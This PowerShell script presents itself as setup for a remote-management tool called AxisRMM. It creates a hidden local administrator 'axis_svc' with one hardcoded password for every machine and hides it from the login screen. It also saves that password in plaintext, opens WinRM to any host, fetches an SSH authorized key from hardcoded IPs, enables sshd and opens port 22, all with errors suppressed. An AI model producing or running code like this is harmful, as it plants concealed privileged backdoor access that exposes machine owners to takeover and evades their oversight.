$ErrorActionPreference = "SilentlyContinue"
Write-Host "[Axis Setup] Configuring remote access on $env:COMPUTERNAME"

# Fixed password from vault — same on every machine
$pw = 'Ax!s2026#'
$secPw = ConvertTo-SecureString $pw -AsPlainText -Force

# Create or update hidden axis_svc admin (idempotent)
$existing = Get-LocalUser -Name "axis_svc" -EA SilentlyContinue
if ($existing) {
    Set-LocalUser -Name "axis_svc" -Password $secPw -PasswordNeverExpires $true
    Write-Host "[Axis Setup] Updated axis_svc password"
} else {
    New-LocalUser -Name "axis_svc" -Password $secPw -Description "AxisRMM Service" -AccountNeverExpires -PasswordNeverExpires | Out-Null
    Write-Host "[Axis Setup] Created axis_svc"
}
Add-LocalGroupMember -Group "Administrators" -Member "axis_svc" -EA SilentlyContinue

# Hide from login screen
New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force -EA 0 | Out-Null
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "axis_svc" -Value 0 -Type DWord

# Save password for Axis use (SYSTEM-readable only)
$pwFile = "C:\ProgramData\AxisRMM\axis_svc_init.txt"
New-Item (Split-Path $pwFile) -ItemType Directory -Force -EA 0 | Out-Null
$pw | Out-File $pwFile -Encoding ASCII -Force
icacls $pwFile /inheritance:r /grant "SYSTEM:(R)" 2>$null | Out-Null

# Enable WinRM
Enable-PSRemoting -Force -SkipNetworkProfileCheck -EA 0
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force -EA 0
Set-Service WinRM -StartupType Automatic; Start-Service WinRM

# Drop SSH key
$sshDir = "C:\ProgramData\ssh"
New-Item $sshDir -ItemType Directory -Force | Out-Null
$urls = @("http://192.168.239.50:8772/portal/axis_windows.pub", "http://192.168.4.99:8099/axis_windows.pub")
foreach ($u in $urls) {
    try { Invoke-WebRequest $u -OutFile "$sshDir\administrators_authorized_keys" -UseBasicParsing -TimeoutSec 10; break } catch {}
}
icacls "$sshDir\administrators_authorized_keys" /inheritance:r /grant "SYSTEM:(R)" /grant "Administrators:(R)" 2>$null | Out-Null

# Enable OpenSSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -EA 0
Set-Service sshd -StartupType Automatic -EA 0; Start-Service sshd -EA 0
New-NetFirewallRule -Name "OpenSSH-Server" -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -EA 0 | Out-Null

Write-Host "[Axis Setup] Done: axis_svc + WinRM + SSH on $env:COMPUTERNAME"
